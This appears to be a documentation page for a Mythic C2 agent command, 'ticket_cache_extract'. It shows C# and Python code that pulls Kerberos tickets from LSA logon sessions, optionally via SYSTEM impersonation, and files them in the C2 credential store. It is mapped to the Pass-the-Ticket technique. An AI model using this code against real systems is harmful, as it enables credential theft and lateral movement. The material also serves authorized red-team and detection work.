+++
title = "ticket_cache_extract"
chapter = false
weight = 103
hidden = false
+++

{{% notice info %}}
Artifacts Generated: WindowsAPIInvoke
{{% /notice %}}

## Summary
Extracts Kerberos tickets from the current or specified logon session using LSA APIs. Retrieves ticket details and encoded ticket data, then automatically creates credential entries in Mythic's credential store for extracted tickets.

- **Needs Admin:** False (elevated context required for targeting specific LUIDs)
- **Version:** 2
- **Author:** @drago-qcc

### Arguments
- **service** (String, Required) - Service name to extract ticket for (e.g., "krbtgt" for TGT, "cifs", "host", "ldap")
- **luid** (String, Optional) - Target LUID for ticket extraction (requires elevation)

## Usage
```
ticket_cache_extract {"service": "krbtgt"}
ticket_cache_extract {"service": "cifs", "luid": "0x12345678"}
ticket_cache_extract {"service": "ldap"}
```

**Output:**
```
Added credential to Mythic for user@DOMAIN.COM
```

## Detailed Summary

### Agent Execution Flow

#### 1. Parameter Processing and Validation
```python
async def parse_arguments(self):
    if self.command_line[0] != "{":
        raise Exception("Require JSON blob, but got raw command line.")
    self.load_args_from_json_string(self.command_line)
```
- Requires JSON parameter format only
- Validates service parameter is provided
- LUID parameter is optional for targeting specific sessions

#### 2. Ticket Extraction Process (C#)
```csharp
// From KerberosHelpers.cs - ExtractTicket method
internal static (KerberosTicket?, string) ExtractTicket(LUID targetLuid, string targetName)
{
    targetName = targetName.Trim();
    (HANDLE lsaHandle, uint authPackage, IEnumerable<LUID> _, string error) = InitKerberosConnectionAndSessionInfo();
    
    if(Agent.GetIdentityManager().GetIntegrityLevel() is <= IntegrityLevel.MediumIntegrity)
    {
        DebugHelp.DebugWriteLine("Not high integrity, setting target luid to null");
        targetLuid = new LUID();
    }
    
    var ticket = GetTicketCache(lsaHandle, authPackage, targetLuid)
        .FirstOrDefault(x => x.ServerName.Contains(targetName));
    
    if(ticket is null)
    {
        return (null, $"Failed to find ticket for {targetName}");
    }
}
```
- Trims service name parameter
- Initializes LSA connection and Kerberos authentication package
- Clears target LUID for non-elevated contexts
- Searches ticket cache for matching service name

#### 3. LSA Connection and Package Resolution
```csharp
// From KerberosHelpers.cs
private static HANDLE GetLsaHandleUntrusted(bool elevateToSystem = true)
{
    if(Agent.GetIdentityManager().GetIntegrityLevel() is IntegrityLevel.HighIntegrity && elevateToSystem)
    {
        (elevated, _systemHandle) = Agent.GetIdentityManager().GetSystem();
        createdArtifacts.Add(Artifact.PrivilegeEscalation("SYSTEM"));
        
        if (elevated)
        {
            var originalUser = WindowsIdentity.Impersonate(_systemHandle);
            WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
            originalUser.Undo();
            createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaConnectUntrusted"));
        }
    }
    else
    {
        WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
        createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaConnectUntrusted"));
    }
    return lsaHandle;
}
```
- Establishes LSA connection using `LsaConnectUntrusted`
- Elevates to SYSTEM for high integrity contexts when needed
- Looks up Kerberos authentication package
- Generates artifacts for API calls

#### 4. Ticket Cache Enumeration
```csharp
// From KerberosHelpers.cs - GetTicketCache method
private static IEnumerable<KerberosTicket> GetTicketCache(HANDLE lsaHandle, uint authPackage, LUID logonId)
{
    LUID UsedlogonId = logonId;
    if (Agent.GetIdentityManager().GetIntegrityLevel() <= IntegrityLevel.MediumIntegrity)
    {
        UsedlogonId = new LUID();
    }

    KERB_QUERY_TKT_CACHE_REQUEST request = new()
    {
        MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage,
        LogonId = UsedlogonId
    };

    var status = WindowsAPI.LsaCallAuthenticationPackageDelegate(lsaHandle, authPackage, requestHandle, Marshal.SizeOf(request), out HANDLE returnBuffer, out uint returnLength, out NTSTATUS returnStatus);
    createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaCallAuthenticationPackage"));
}
```
- Creates `KERB_QUERY_TKT_CACHE_REQUEST` structure
- Uses current session LUID for non-elevated contexts
- Calls `LsaCallAuthenticationPackage` to enumerate tickets
- Processes returned ticket information

#### 5. Ticket Retrieval Process
```csharp
// From ExtractTicket method
KERB_RETRIEVE_TKT_REQUEST request = new()
{
    MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage,
    LogonId = targetLuid,
    TargetName = new(ticket.ServerName),
    TicketFlags = 0,
    CacheOptions = KerbCacheOptions.KERB_RETRIEVE_TICKET_AS_KERB_CRED,
    EncryptionType = 0
};

var requestSize = Marshal.SizeOf<KERB_RETRIEVE_TKT_REQUEST>();
var targetNameSize = request.TargetName.MaximumLength;
var requestPlusNameSize = requestSize + targetNameSize;
HANDLE requestAndNameHandle = new(Marshal.AllocHGlobal(requestPlusNameSize));

Marshal.StructureToPtr(request, requestAndNameHandle, false);
HANDLE requestEndAddress = new(new(requestAndNameHandle.PtrLocation.ToInt64() + requestSize));
WindowsAPI.RtlMoveMemoryDelegate(requestEndAddress, request.TargetName.Buffer, targetNameSize);
createdArtifacts.Add(Artifact.WindowsAPIInvoke("RtlMoveMemory"));

Marshal.WriteIntPtr(requestAndNameHandle, IntPtr.Size == 8 ? 24 : 16, requestEndAddress);
```
- Creates `KERB_RETRIEVE_TKT_REQUEST` for specific ticket retrieval
- Allocates memory for request structure and target name
- Uses `RtlMoveMemory` to copy target name data
- Updates structure pointers for proper memory layout

#### 6. Ticket Data Extraction
```csharp
var status = WindowsAPI.LsaCallAuthenticationPackageDelegate(lsaHandle, authPackage, requestAndNameHandle, requestPlusNameSize, out HANDLE returnBuffer, out uint returnLength, out NTSTATUS returnStatus);
createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaCallAuthenticationPackage"));

if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
{
    return (null, $"Failed to submit ticket.\nLsaCallAuthentication returned {status} (0x{WindowsAPI.LsaNtStatusToWinErrorDelegate(status)}) with protocolStatus {returnStatus} (0x{WindowsAPI.LsaNtStatusToWinErrorDelegate(returnStatus)})");
}

var response = returnBuffer.CastTo<KERB_RETRIEVE_TKT_RESPONSE>();

if (response.Ticket.EncodedTicketSize == 0)
{
    WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
    return (null, "No ticket Data to extract");
}

ticket.Kirbi = new byte[response.Ticket.EncodedTicketSize];
Marshal.Copy(response.Ticket.EncodedTicket, ticket.Kirbi, 0, (int)response.Ticket.EncodedTicketSize);
```
- Retrieves encoded ticket data from LSA
- Validates ticket extraction success
- Copies ticket data to byte array
- Handles memory cleanup

#### 7. Completion Function and Credential Processing
```python
async def parse_credentials(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    responses = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID))
    
    for output in responses.Responses:
        try:
            ticket_out = json.loads(str(output.Response))
            ccache = CCache()
            ccache.fromKRBCRED(base64.b64decode(ticket_out['ticket']))
            
            formattedComment = f"Service: {ccache.credentials[0].__getitem__('server').prettyPrint().decode('utf-8')}\n"
            formattedComment += f"Start: {datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['starttime']).isoformat()}\n"
            formattedComment += f"End: {datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['endtime']).isoformat()}\n"
            formattedComment += f"Renew: {datetime.fromtimestamp(ccache.credentials[0].__getitem__('time')['renew_till']).isoformat()}\n"
            
            resp = await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
                TaskID=task.TaskData.Task.ID,
                Credentials=[MythicRPCCredentialData(
                    credential_type="ticket",
                    credential=ticket_out['ticket'],
                    account=ccache.credentials[0].__getitem__("client").prettyPrint().decode('utf-8'),
                    realm=ccache.credentials[0].__getitem__("client").prettyPrint().decode('utf-8').split("@")[1],
                    comment=formattedComment,
                )]
            ))
```
- Processes task responses containing extracted tickets
- Uses Impacket CCache to parse ticket structure
- Extracts metadata (service, timing, client information)
- Creates credential entries in Mythic credential store

#### 8. Response Processing and Feedback
```python
if resp.Success:
    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
        TaskID=task.TaskData.Task.ID,
        Response=f"\nAdded credential to Mythic for {ccache.credentials[0].__getitem__('client').prettyPrint().decode('utf-8')}".encode()
    ))
else:
    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
        TaskID=task.TaskData.Task.ID,
        Response=f"\nFailed to add to Mythic's credential store:\n{resp.Error}".encode()
    ))
```
- Provides feedback on credential creation success/failure
- Shows client principal name for successful extractions
- Reports detailed error information for failures

### Kerberos Structures and Operations

#### KERB_QUERY_TKT_CACHE_REQUEST
```csharp
KERB_QUERY_TKT_CACHE_REQUEST request = new()
{
    MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage,
    LogonId = UsedlogonId
};
```
- **MessageType**: Specifies cache query operation
- **LogonId**: Target logon session (null for current session)

#### KERB_RETRIEVE_TKT_REQUEST
```csharp
KERB_RETRIEVE_TKT_REQUEST request = new()
{
    MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage,
    LogonId = targetLuid,
    TargetName = new(ticket.ServerName),
    TicketFlags = 0,
    CacheOptions = KerbCacheOptions.KERB_RETRIEVE_TICKET_AS_KERB_CRED,
    EncryptionType = 0
};
```
- **MessageType**: Specifies ticket retrieval operation
- **TargetName**: Service principal name to extract
- **CacheOptions**: Returns ticket as Kerberos credential

### Error Handling

#### LSA Operation Errors
```csharp
if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
{
    return (null, $"Failed to submit ticket.\nLsaCallAuthentication returned {status} (0x{WindowsAPI.LsaNtStatusToWinErrorDelegate(status)}) with protocolStatus {returnStatus} (0x{WindowsAPI.LsaNtStatusToWinErrorDelegate(returnStatus)})");
}
```
- Validates both API status and protocol status
- Converts NTSTATUS codes to Win32 error codes
- Provides detailed error context

#### Ticket Search Failures
```csharp
if(ticket is null)
{
    return (null, $"Failed to find ticket for {targetName}");
}
```
- Handles cases where requested service ticket not found
- Provides specific error message with service name

#### Memory and Resource Cleanup
```csharp
finally
{
    WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
    WindowsAPI.LsaDeregisterLogonProcessDelegate(lsaHandle);
    createdArtifacts.Add(Artifact.WindowsAPIInvoke("LsaDeregisterLogonProcess"));
}
```
- Ensures proper cleanup of LSA resources
- Frees return buffers and handles
- Generates artifacts for cleanup operations

### Integration with TicketManager

#### Interface Methods
```csharp
// From KerberosTicketManager.cs
public (KerberosTicket?, string) ExtractTicketFromCache(string luid, string serviceName) => 
    KerberosHelpers.ExtractTicket(WinNTTypes.LUID.FromString(luid), serviceName);
```
- Provides clean interface to extraction functionality
- Handles LUID string conversion
- Returns ticket object and error messages

### Completion Function Integration

#### Asynchronous Processing
```python
class ticket_cache_extractCommand(CommandBase):
    completion_functions = {"parse_credentials": parse_credentials}
    
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        response.CompletionFunctionName = "parse_credentials"
        return response
```
- Registers completion function for post-processing
- Automatically processes extracted tickets
- Creates credential entries without additional operator action

## APIs Used
| API | Purpose | DLL |
|-----|---------|-----|
| `LsaConnectUntrusted` | Connect to LSA | advapi32.dll |
| `LsaLookupAuthenticationPackage` | Get Kerberos auth package | advapi32.dll |
| `LsaCallAuthenticationPackage` | Query and retrieve tickets | advapi32.dll |
| `LsaFreeReturnBuffer` | Free LSA memory | advapi32.dll |
| `LsaDeregisterLogonProcess` | Close LSA connection | advapi32.dll |
| `RtlMoveMemory` | Copy memory for request structure | ntdll.dll |
| `LsaNtStatusToWinError` | Convert NTSTATUS to Win32 | advapi32.dll |

## MITRE ATT&CK Mapping
- **T1550** - Use Alternate Authentication Material
- **T1550.003** - Use Alternate Authentication Material: Pass the Ticket

## Security Considerations
- **Ticket Extraction**: Retrieves sensitive Kerberos authentication material
- **LSA Interaction**: Direct interaction with Local Security Authority
- **Credential Storage**: Extracted tickets stored in Mythic credential database
- **Cross-Session Access**: Can extract from other sessions when elevated
- **Memory Exposure**: Ticket data temporarily held in process memory

## Limitations
1. **JSON Format Only**: Requires JSON parameter format
2. **Service Name Matching**: Uses substring matching for service names
3. **Elevation for LUID**: Cross-session extraction requires elevated context
4. **Ticket Availability**: Can only extract existing tickets from cache
5. **LSA Dependencies**: Requires functional LSA subsystem
6. **Session Access**: Limited to accessible logon sessions

## Error Conditions
- **Invalid JSON**: Malformed JSON parameters
- **Service Not Found**: No ticket found for specified service name
- **LSA Connection Failed**: Cannot connect to Local Security Authority
- **Package Lookup Failed**: Kerberos authentication package not found
- **Ticket Retrieval Failed**: LSA failed to retrieve ticket data
- **No Ticket Data**: Ticket exists but contains no encoded data
- **Access Denied**: Insufficient privileges for target LUID
- **Memory Allocation Failed**: Cannot allocate memory for request structures

## Best Practices
1. **Service Name Accuracy**: Use correct service principal names
2. **Session Targeting**: Understand LUID implications when elevated
3. **Error Monitoring**: Check for extraction and credential creation failures
4. **Credential Management**: Leverage automatic Mythic credential store integration
5. **Resource Awareness**: Monitor memory usage during extraction operations